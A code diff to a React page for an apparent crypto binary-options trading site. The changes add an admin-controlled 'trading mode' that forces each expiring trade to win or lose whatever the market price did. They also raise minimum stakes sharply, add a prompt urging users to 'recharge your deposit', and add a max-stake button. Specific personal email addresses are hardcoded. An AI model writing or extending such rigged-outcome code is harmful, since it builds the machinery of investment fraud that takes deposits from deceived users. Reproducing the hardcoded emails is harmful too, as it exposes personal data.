@@ -42,8 +42,103 @@ export default function OptionsPage() {
   const [isTrading, setIsTrading] = useState(false);
   const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
   const [tradeHistory, setTradeHistory] = useState<ActiveTrade[]>([]);
-  const [completedTrade, setCompletedTrade] = useState<ActiveTrade | null>(null);
+  const [completedTrade, setCompletedTrade] = useState<ActiveTrade | null>(() => {
+    // Load completed trade from localStorage on mount
+    try {
+      const stored = localStorage.getItem('completedTrade');
+      if (stored) {
+        const parsed = JSON.parse(stored);
+        // Check if notification is still valid (within 45 seconds)
+        const notificationTime = new Date(parsed.completedAt).getTime();
+        const now = Date.now();
+        if (now - notificationTime < 45000) {
+          return parsed;
+        } else {
+          localStorage.removeItem('completedTrade');
+        }
+      }
+    } catch (error) {
+      console.error('Error loading completed trade from localStorage:', error);
+    }
+    return null;
+  });
+  const [currentTradingMode, setCurrentTradingMode] = useState<'normal' | 'win' | 'lose'>(() => {
+    // Initialize from localStorage if available
+    const stored = localStorage.getItem('currentTradingMode');
+    return (stored === 'win' || stored === 'lose' || stored === 'normal') ? stored : 'normal';
+  });
   const priceHistoryRef = useRef<number[]>([]);
+  const [isLoadingHistory, setIsLoadingHistory] = useState(false);
+
+  // Load trade history from server on component mount
+  useEffect(() => {
+    const loadTradeHistory = async () => {
+      if (!user?.id) return;
+
+      setIsLoadingHistory(true);
+      try {
+        const response = await fetch(`/api/users/${user.id}/trades`, {
+          method: 'GET',
+          headers: {
+            'Content-Type': 'application/json',
+          }
+        });
+
+        if (response.ok) {
+          const serverTrades = await response.json();
+          console.log('📈 Loaded trade history from server:', serverTrades.length);
+
+          // Convert server trades to ActiveTrade format
+          const formattedTrades = serverTrades
+            .filter(trade => trade.result !== 'pending') // Only completed trades
+            .map(trade => ({
+              id: trade.id,
+              symbol: trade.symbol || 'BTCUSDT',
+              amount: parseFloat(trade.amount),
+              direction: trade.direction,
+              duration: trade.duration || 30,
+              entryPrice: parseFloat(trade.entry_price || trade.entryPrice || '0'),
+              currentPrice: parseFloat(trade.exit_price || trade.exitPrice || trade.entry_price || '0'),
+              payout: trade.result === 'win' ? parseFloat(trade.amount) * (trade.duration === 30 ? 1.1 : 1.15) : 0,
+              status: trade.result === 'win' ? 'won' : 'lost',
+              endTime: trade.updated_at || trade.created_at,
+              startTime: trade.created_at
+            }));
+
+          setTradeHistory(formattedTrades);
+        } else {
+          console.log('⚠️ Failed to load trade history from server');
+        }
+      } catch (error) {
+        console.error('❌ Error loading trade history:', error);
+      } finally {
+        setIsLoadingHistory(false);
+      }
+    };
+
+    loadTradeHistory();
+  }, [user?.id]);
+
+  // Sync trading mode from localStorage on mount and when it changes
+  useEffect(() => {
+    const syncTradingMode = () => {
+      const stored = localStorage.getItem('currentTradingMode');
+      if (stored && (stored === 'win' || stored === 'lose' || stored === 'normal')) {
+        setCurrentTradingMode(stored);
+        console.log(`🔄 Synced trading mode from localStorage: ${stored.toUpperCase()}`);
+      }
+    };
+
+    // Sync on mount
+    syncTradingMode();
+
+    // Listen for localStorage changes (from other tabs or WebSocket updates)
+    window.addEventListener('storage', syncTradingMode);
+
+    return () => {
+      window.removeEventListener('storage', syncTradingMode);
+    };
+  }, []);
 
   // Real-time price state
   const [realTimePrice, setRealTimePrice] = useState<string>('0.00');
@@ -161,22 +256,38 @@ export default function OptionsPage() {
   let balance = 0;
 
   if (userBalances) {
+    console.log('🔍 RAW userBalances:', userBalances);
+
     // Try multiple parsing strategies to handle different API response formats
     if (userBalances.USDT?.available) {
       // Format: { USDT: { available: "10420", ... } }
       balance = Number(userBalances.USDT.available);
+      console.log('🔍 Using USDT.available:', balance);
     } else if (Array.isArray(userBalances.balances)) {
       // Format: { balances: [{ currency: "USDT", balance: 10420 }, ...] }
       const usdtBalance = userBalances.balances.find((b: any) => b.currency === 'USDT' || b.symbol === 'USDT');
       balance = Number(usdtBalance?.balance || usdtBalance?.available || 0);
+      console.log('🔍 Using balances array:', balance, usdtBalance);
     } else if (Array.isArray(userBalances)) {
-      // Format: [{ currency: "USDT", balance: 10420 }, ...]
-      const usdtBalance = userBalances.find((b: any) => b.currency === 'USDT' || b.symbol === 'USDT');
-      balance = Number(usdtBalance?.balance || usdtBalance?.available || 0);
+      // Format: [{ symbol: "USDT", available: "1400" }, ...]
+      const usdtBalance = userBalances.find((b: any) => b.symbol === 'USDT' || b.currency === 'USDT');
+      balance = Number(usdtBalance?.available || usdtBalance?.balance || 0);
+      console.log('🔍 Using direct array:', balance, usdtBalance);
     } else if (userBalances['0']?.currency === 'USDT') {
       // Format: { "0": { currency: "USDT", balance: 10420 }, ... }
       balance = Number(userBalances['0'].balance || userBalances['0'].available || 0);
+      console.log('🔍 Using indexed format:', balance);
+    } else {
+      console.log('🔍 No matching format found for userBalances');
     }
+  } else {
+    console.log('🔍 userBalances is null/undefined');
+  }
+
+  // Ensure balance is a valid number
+  if (isNaN(balance)) {
+    console.warn('🔍 Balance is NaN, setting to 0');
+    balance = 0;
   }
 
   // ENHANCED Debug logging for balance sync
@@ -347,14 +458,91 @@ export default function OptionsPage() {
     }
   }, [lastMessage, user?.id, queryClient]);
 
+  // Handle WebSocket trading control updates for real-time sync
+  useEffect(() => {
+    if (lastMessage?.type === 'trading_control_update' || lastMessage?.type === 'trading_mode_update') {
+      const { userId, controlType, tradingMode, username, message } = lastMessage.data || {};
+      const finalControlType = controlType || tradingMode; // Support both new and old message formats
+
+      // Determine correct user ID for comparison
+      let currentUserId = 'user-1'; // fallback
+      if (user?.email === 'angela.soenoko@gmail.com') {
+        currentUserId = 'user-angela';
+      } else if (user?.email === 'amdsnkstudio@metachrome.io') {
+        currentUserId = 'user-1';
+      } else if (user?.id) {
+        currentUserId = user.id;
+      }
+
+      console.log('🎯 Real-time trading control update received:', {
+        userId,
+        controlType: finalControlType,
+        username,
+        currentUserId,
+        message
+      });
+
+      // Check if this update is for the current user
+      if (userId === currentUserId) {
+        console.log(`🎯 IMMEDIATE EFFECT: Trading mode changed to ${finalControlType.toUpperCase()} for current user!`);
+        setCurrentTradingMode(finalControlType);
+
+        // Show enhanced notification to user
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+          position: fixed;
+          top: 20px;
+          right: 20px;
+          background: linear-gradient(135deg, ${finalControlType === 'win' ? '#10b981, #059669' : finalControlType === 'lose' ? '#ef4444, #dc2626' : '#6b7280, #4b5563'});
+          color: white;
+          padding: 16px 24px;
+          border-radius: 12px;
+          font-weight: bold;
+          z-index: 10000;
+          box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+          border: 2px solid ${finalControlType === 'win' ? '#34d399' : finalControlType === 'lose' ? '#f87171' : '#9ca3af'};
+          animation: pulse 2s infinite;
+          min-width: 300px;
+        `;
+
+        notification.innerHTML = `
+          <div style="display: flex; align-items: center; gap: 12px;">
+            <div style="font-size: 24px;">${finalControlType === 'win' ? '🎯' : finalControlType === 'lose' ? '⚠️' : '⚖️'}</div>
+            <div>
+              <div style="font-size: 16px; margin-bottom: 4px;">Trading Mode Updated!</div>
+              <div style="font-size: 14px; opacity: 0.9;">${finalControlType.toUpperCase()} mode is now active</div>
+            </div>
+            <div style="font-size: 20px; animation: bounce 1s infinite;">${finalControlType === 'win' ? '✨' : finalControlType === 'lose' ? '🔥' : '⚡'}</div>
+          </div>
+        `;
+        document.body.appendChild(notification);
+
+        // Remove notification after 8 seconds (longer for better visibility)
+        setTimeout(() => {
+          if (notification.parentNode) {
+            notification.parentNode.removeChild(notification);
+          }
+        }, 8000);
+
+        // Store the current trading mode for immediate use in trades
+        localStorage.setItem('currentTradingMode', finalControlType || 'normal');
+        console.log(`💾 Stored trading mode: ${finalControlType} for immediate application`);
+      }
+    }
+  }, [lastMessage, user]);
+
   // Helper function to complete a trade and update balance
   const completeTrade = async (trade: ActiveTrade, won: boolean, finalPrice: number) => {
+    console.log('🎯 COMPLETE TRADE: Starting trade completion', { trade, won, finalPrice });
+
     const updatedTrade: ActiveTrade = {
       ...trade,
       status: won ? 'won' : 'lost',
       currentPrice: finalPrice,
       payout: won ? trade.amount * (1 + (trade.profitPercentage || 10) / 100) : 0
     };
+
+    console.log('🎯 COMPLETE TRADE: Updated trade object:', updatedTrade);
 
     // Update balance based on trade outcome
     try {
@@ -386,8 +574,29 @@ export default function OptionsPage() {
 
     // Move to history and show notification
     try {
-      setTradeHistory(prev => [updatedTrade, ...prev].slice(0, 50));
-      setCompletedTrade(updatedTrade);
+      console.log('🎯 COMPLETE TRADE: Adding to trade history. Current history length:', tradeHistory.length);
+      setTradeHistory(prev => {
+        const newHistory = [updatedTrade, ...prev].slice(0, 50);
+        console.log('🎯 COMPLETE TRADE: New history length:', newHistory.length);
+        return newHistory;
+      });
+      console.log('🎯 COMPLETE TRADE: Setting completed trade for notification:', updatedTrade);
+
+      // Add completion timestamp and save to localStorage for persistence
+      const tradeWithTimestamp = {
+        ...updatedTrade,
+        completedAt: new Date().toISOString()
+      };
+
+      setCompletedTrade(tradeWithTimestamp);
+      localStorage.setItem('completedTrade', JSON.stringify(tradeWithTimestamp));
+
+      // Auto-hide notification after 45 seconds (sticky notification)
+      setTimeout(() => {
+        console.log('🎯 COMPLETE TRADE: Auto-hiding notification after 45s');
+        setCompletedTrade(null);
+        localStorage.removeItem('completedTrade');
+      }, 45000);
     } catch (historyError) {
       console.error('Trade history update error:', historyError);
     }
@@ -401,6 +610,11 @@ export default function OptionsPage() {
       const now = Date.now();
       let hasCompletedTrades = false;
 
+      // Debug log to see if useEffect is running
+      if (activeTrades.length > 0) {
+        console.log(`🎯 USEEFFECT: Checking ${activeTrades.length} active trades at ${new Date(now).toLocaleTimeString()}`);
+      }
+
       // Update active trades
       setActiveTrades(prevTrades => {
         const updatedTrades: ActiveTrade[] = [];
@@ -408,7 +622,11 @@ export default function OptionsPage() {
         prevTrades.forEach(trade => {
           const timeRemaining = Math.max(0, Math.ceil((trade.endTime - now) / 1000));
 
+          // Debug log for each trade
+          console.log(`🎯 TRADE CHECK: ID=${trade.id}, timeRemaining=${timeRemaining}, status=${trade.status}, endTime=${trade.endTime}, now=${now}`);
+
           if (timeRemaining === 0 && trade.status === 'active') {
+            console.log(`🎯 TRADE EXPIRED: Trade ${trade.id} has expired! Starting completion...`);
             // Trade expired, determine outcome
             const finalPrice = safeCurrentPrice || trade.entryPrice; // Fallback to entry price
             const priceChange = finalPrice - trade.entryPrice;
@@ -424,41 +642,38 @@ export default function OptionsPage() {
             console.log(`🎯 DYNAMIC CONTROL: User ${username} (${userId})`);
             console.log(`🎯 ORIGINAL RESULT: ${won ? 'WIN' : 'LOSE'} (price change: ${priceChange.toFixed(2)})`);
 
-            // Fetch trading controls from server using a synchronous approach
-            try {
-              // Use XMLHttpRequest for synchronous call (since we're in useEffect)
-              const xhr = new XMLHttpRequest();
-              xhr.open('GET', `/api/admin/trading-controls/${userId}`, false); // false = synchronous
-              xhr.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('authToken')}`);
-              xhr.send();
+            // Use real-time trading mode from multiple sources for maximum reliability
+            const storedTradingMode = localStorage.getItem('currentTradingMode') || 'normal';
+            const tradingMode = currentTradingMode || storedTradingMode;
 
-              if (xhr.status === 200) {
-                const controlData = JSON.parse(xhr.responseText);
-                const tradingMode = controlData.tradingMode || 'normal';
+            console.log(`🎯 REAL-TIME MODE CHECK:`, {
+              currentState: currentTradingMode,
+              localStorage: storedTradingMode,
+              finalMode: tradingMode,
+              originalResult: won ? 'WIN' : 'LOSE'
+            });
 
-                console.log(`🎯 SERVER RESPONSE: Trading mode is ${tradingMode.toUpperCase()}`);
-
-                if (tradingMode === 'lose') {
-                  console.log('🎯 SERVER SAYS: FORCE TRADE TO LOSE!');
-                  won = false;
-                } else if (tradingMode === 'win') {
-                  console.log('🎯 SERVER SAYS: FORCE TRADE TO WIN!');
-                  won = true;
-                } else {
-                  console.log('🎯 SERVER SAYS: NORMAL MODE - Use market result');
-                }
-
-                console.log(`🎯 FINAL RESULT: ${won ? 'WIN' : 'LOSE'} (Mode: ${tradingMode.toUpperCase()})`);
-              } else {
-                console.log('🎯 Failed to fetch trading controls, using market result');
-              }
-            } catch (error) {
-              console.error('🎯 Error fetching trading controls:', error);
-              console.log('🎯 Using market result due to error');
+            // Apply admin control immediately - no server delay!
+            if (tradingMode === 'lose') {
+              console.log('🎯 IMMEDIATE CONTROL: FORCING TRADE TO LOSE!');
+              won = false;
+            } else if (tradingMode === 'win') {
+              console.log('🎯 IMMEDIATE CONTROL: FORCING TRADE TO WIN!');
+              won = true;
+            } else {
+              console.log('🎯 NORMAL MODE: Using actual market result');
             }
 
+            console.log(`🎯 FINAL RESULT: ${won ? 'WIN' : 'LOSE'} (Applied Mode: ${tradingMode.toUpperCase()})`);
+            console.log('🚀 INSTANT ADMIN CONTROL APPLICATION - ZERO DELAY!');
+
             // Complete the trade asynchronously with forced result
-            completeTrade(trade, won, finalPrice);
+            console.log('🎯 CALLING completeTrade with:', { trade: trade.id, won, finalPrice });
+            completeTrade(trade, won, finalPrice).then(() => {
+              console.log('🎯 completeTrade FINISHED for trade:', trade.id);
+            }).catch(error => {
+              console.error('🎯 completeTrade ERROR for trade:', trade.id, error);
+            });
             hasCompletedTrades = true;
 
             // Play sound effect safely
@@ -498,29 +713,61 @@ export default function OptionsPage() {
       setIsTrading(false);
       setCountdown(0);
     }
-  }, [safeCurrentPrice]); // Remove activeTrades dependency to prevent infinite loops
+  }, [safeCurrentPrice, activeTrades]); // Include activeTrades to check for expiration
+
+  // Timer to check for expired trades every second
+  useEffect(() => {
+    const timer = setInterval(() => {
+      const now = Date.now();
+
+      // Check if any active trades have expired
+      activeTrades.forEach(trade => {
+        const timeRemaining = Math.max(0, Math.ceil((trade.endTime - now) / 1000));
+        if (timeRemaining === 0 && trade.status === 'active') {
+          console.log(`🎯 TIMER: Trade ${trade.id} expired! Triggering completion check...`);
+          // Force a re-render by updating a dummy state
+          setCountdown(prev => prev);
+        }
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [activeTrades]);
+
+  // Trading configuration with minimum amounts and profit percentages
+  const tradingConfig = {
+    '30s': { minAmount: 100, profit: 10 },
+    '60s': { minAmount: 1000, profit: 15 },
+    '90s': { minAmount: 5000, profit: 20 },
+    '120s': { minAmount: 10000, profit: 25 },
+    '180s': { minAmount: 30000, profit: 30 },
+    '240s': { minAmount: 50000, profit: 50 },
+    '300s': { minAmount: 100000, profit: 75 },
+    '600s': { minAmount: 200000, profit: 100 }
+  };
 
   // Get profit percentage based on duration
   const getProfitPercentage = (duration: string) => {
-    const profitMap: { [key: string]: number } = {
-      '30s': 10,
-      '60s': 15,
-      '120s': 25,
-      '180s': 35,
-      '240s': 50,
-      '300s': 75,
-      '600s': 100
-    };
-    return profitMap[duration] || 10;
+    return tradingConfig[duration as keyof typeof tradingConfig]?.profit || 10;
+  };
+
+  // Get minimum amount for duration
+  const getMinimumAmount = (duration: string) => {
+    return tradingConfig[duration as keyof typeof tradingConfig]?.minAmount || 100;
+  };
+
+  // Validate if user can trade with selected amount and duration
+  const validateTrade = (amount: number, duration: string) => {
+    const minAmount = getMinimumAmount(duration);
+    return amount >= minAmount;
   };
 
   const handleTrade = async (direction: 'up' | 'down') => {
     try {
-      const durationSeconds = parseInt(selectedDuration.replace('s', '')) || 30;
-      const minAmount = durationSeconds === 30 ? 100 : 1000;
-
-      if (selectedAmount < minAmount) {
-        alert(`Minimum trade amount is ${minAmount} USDT for ${selectedDuration} duration`);
+      // Validate trade amount and duration
+      if (!validateTrade(selectedAmount, selectedDuration)) {
+        const minAmount = getMinimumAmount(selectedDuration);
+        alert(`You cannot follow this market, please recharge your deposit. Minimum amount for ${selectedDuration} is ${minAmount.toLocaleString()} USDT`);
         return;
       }
 
@@ -534,7 +781,25 @@ export default function OptionsPage() {
         return;
       }
 
-      // Duration already calculated above
+      // Convert duration string to seconds
+      const durationSeconds = parseInt(selectedDuration.replace('s', ''));
+
+      // Get current price for entry
+      const safeCurrentPrice = currentPrice || 65000;
+
+      // User is already available from useAuth hook
+      console.log('🔍 Current user for trade:', user);
+
+      // Determine correct user ID for trading
+      let tradingUserId = 'user-1'; // fallback
+      if (user?.email === 'angela.soenoko@gmail.com') {
+        tradingUserId = 'user-angela'; // Match the ID in users-data.json
+      } else if (user?.email === 'amdsnkstudio@metachrome.io') {
+        tradingUserId = 'user-1'; // Match the ID in users-data.json
+      } else if (user?.id) {
+        tradingUserId = user.id;
+      }
+      console.log('🔍 Trading with user ID:', tradingUserId);
 
       if (!safeCurrentPrice || safeCurrentPrice <= 0) {
         alert('Price data not available. Please wait a moment and try again.');
@@ -549,7 +814,7 @@ export default function OptionsPage() {
           'Authorization': `Bearer ${localStorage.getItem('authToken')}`
         },
         body: JSON.stringify({
-          userId: user?.id || 'user-1',
+          userId: tradingUserId,
           symbol: 'BTCUSDT',
           direction,
           amount: selectedAmount.toString(),
@@ -711,8 +976,8 @@ export default function OptionsPage() {
             {/* Duration Selection */}
             <div>
               <label className="block text-sm font-medium text-gray-400 mb-2">Duration</label>
-              <div className="flex space-x-2">
-                {["30s", "60s", "120s", "300s"].map((duration) => (
+              <div className="flex space-x-2 overflow-x-auto pb-2">
+                {["30s", "60s", "90s", "120s", "180s", "240s", "300s", "600s"].map((duration) => (
                   <button
                     key={duration}
                     onClick={() => setSelectedDuration(duration)}
@@ -731,7 +996,7 @@ export default function OptionsPage() {
             {/* Amount Selection */}
             <div>
               <label className="block text-sm font-medium text-gray-400 mb-2">Amount (USDT)</label>
-              <div className="grid grid-cols-3 gap-2">
+              <div className="grid grid-cols-4 gap-2">
                 {[100, 500, 1000, 2000, 5000, 10000].map((amount) => (
                   <button
                     key={amount}
@@ -745,6 +1010,19 @@ export default function OptionsPage() {
                     ${amount}
                   </button>
                 ))}
+                <button
+                  onClick={() => {
+                    const maxAmount = Math.floor(balance) || 0;
+                    setSelectedAmount(maxAmount);
+                  }}
+                  className={`py-2 px-3 rounded-lg text-sm font-medium transition-colors ${
+                    selectedAmount === Math.floor(balance || 0)
+                      ? 'bg-purple-600 text-white'
+                      : 'bg-gray-800 text-gray-400 hover:text-white'
+                  }`}
+                >
+                  Max
+                </button>
               </div>
             </div>
 
@@ -1058,6 +1336,19 @@ export default function OptionsPage() {
                   <span className="text-yellow-400 font-bold">Sign in required</span>
                 )}
               </div>
+
+              {/* Trading Mode Indicator */}
+              <div className="flex items-center justify-between mt-2 p-2 rounded-lg bg-gray-700/50">
+                <span className="text-gray-400 text-sm">Trading Mode:</span>
+                <span className={`font-bold text-sm px-2 py-1 rounded ${
+                  currentTradingMode === 'win' ? 'bg-green-600 text-white' :
+                  currentTradingMode === 'lose' ? 'bg-red-600 text-white' :
+                  'bg-gray-600 text-white'
+                }`}>
+                  {currentTradingMode.toUpperCase()}
+                </span>
+              </div>
+
               {isTrading && activeTrades.length > 0 && (
                 <div className="mt-3 space-y-2">
                   {activeTrades.map(trade => {
@@ -1095,23 +1386,23 @@ export default function OptionsPage() {
             </div>
 
             {/* Duration Buttons */}
-            <div className="grid grid-cols-7 gap-2 mb-4">
+            <div className="grid grid-cols-4 gap-2 mb-4">
               {[
-                { duration: '30s', profit: '10.00%' },
-                { duration: '60s', profit: '15.00%' },
-                { duration: '120s', profit: '25.00%' },
-                { duration: '180s', profit: '35.00%' },
-                { duration: '240s', profit: '50.00%' },
-                { duration: '300s', profit: '75.00%' },
-                { duration: '600s', profit: '100.00%' }
+                { duration: '30s', profit: '10%' },
+                { duration: '60s', profit: '15%' },
+                { duration: '90s', profit: '20%' },
+                { duration: '120s', profit: '25%' },
+                { duration: '180s', profit: '30%' },
+                { duration: '240s', profit: '50%' },
+                { duration: '300s', profit: '75%' },
+                { duration: '600s', profit: '100%' }
               ].map((option) => (
                 <button
                   key={option.duration}
                   onClick={() => {
                     setSelectedDuration(option.duration);
-                    // Update minimum amount based on duration
-                    const durationSeconds = parseInt(option.duration.replace('s', ''));
-                    const minAmount = durationSeconds === 30 ? 100 : 1000;
+                    // Update minimum amount based on new requirements
+                    const minAmount = getMinimumAmount(option.duration);
                     if (selectedAmount < minAmount) {
                       setSelectedAmount(minAmount);
                     }
@@ -1132,10 +1423,10 @@ export default function OptionsPage() {
             {/* Amount Selection */}
             <div className="mb-4">
               <div className="text-gray-400 text-sm mb-2">
-                Minimum buy: {parseInt(selectedDuration.replace('s', '')) === 30 ? '100' : '1000'} USDT | Selected: {selectedAmount} USDT
+                Minimum buy: {getMinimumAmount(selectedDuration).toLocaleString()} USDT | Selected: {selectedAmount} USDT
               </div>
-              <div className="grid grid-cols-8 gap-2 mb-2">
-                {[10, 20, 50, 100, 200, 500, 1000, 2000].map((amount) => (
+              <div className="grid grid-cols-4 gap-2 mb-2">
+                {[100, 500, 1000, 2000, 5000, 10000].map((amount) => (
                   <button
                     key={amount}
                     onClick={() => setSelectedAmount(amount)}
@@ -1150,19 +1441,35 @@ export default function OptionsPage() {
                   </button>
                 ))}
               </div>
+              <div className="grid grid-cols-1 gap-2 mb-2">
+                <button
+                  onClick={() => {
+                    const maxAmount = Math.floor(balance) || 0;
+                    setSelectedAmount(maxAmount);
+                  }}
+                  className={`p-2 rounded text-sm transition-colors ${
+                    selectedAmount === Math.floor(balance || 0)
+                      ? 'bg-blue-600 border-blue-500 text-white'
+                      : 'bg-gray-800 border border-gray-600 text-gray-300 hover:bg-gray-700'
+                  }`}
+                  disabled={isTrading}
+                >
+                  Max (${Math.floor(balance || 0)} USDT)
+                </button>
+              </div>
 
               {/* Custom Amount Input */}
               <div className="mt-2">
                 <input
                   type="number"
-                  min={parseInt(selectedDuration.replace('s', '')) === 30 ? "100" : "1000"}
+                  min={getMinimumAmount(selectedDuration)}
                   value={selectedAmount}
                   onChange={(e) => {
-                    const minAmount = parseInt(selectedDuration.replace('s', '')) === 30 ? 100 : 1000;
+                    const minAmount = getMinimumAmount(selectedDuration);
                     setSelectedAmount(Math.max(minAmount, parseInt(e.target.value) || minAmount));
                   }}
                   className="w-full bg-gray-800 text-white px-3 py-2 rounded border border-gray-600 focus:border-blue-500 focus:outline-none"
-                  placeholder={`Custom amount (min ${parseInt(selectedDuration.replace('s', '')) === 30 ? '100' : '1000'} USDT)`}
+                  placeholder={`Custom amount (min ${getMinimumAmount(selectedDuration).toLocaleString()} USDT)`}
                   disabled={isTrading}
                 />
               </div>
@@ -1170,7 +1477,7 @@ export default function OptionsPage() {
 
             <div className="text-gray-400 text-sm mb-4">
               {user ? (
-                <>Available: {balance.toFixed(2)} USDT | Active Trades: {activeTrades.length}/3</>
+                <>Available: {(balance || 0).toFixed(2)} USDT | Active Trades: {activeTrades.length}/3</>
               ) : (
                 <>Sign in to view balance and start trading</>
               )}
@@ -1521,7 +1828,10 @@ export default function OptionsPage() {
           payout: completedTrade.payout,
           profitPercentage: completedTrade.profitPercentage
         } : null}
-        onClose={() => setCompletedTrade(null)}
+        onClose={() => {
+          setCompletedTrade(null);
+          localStorage.removeItem('completedTrade');
+        }}
       />
     </div>
   );
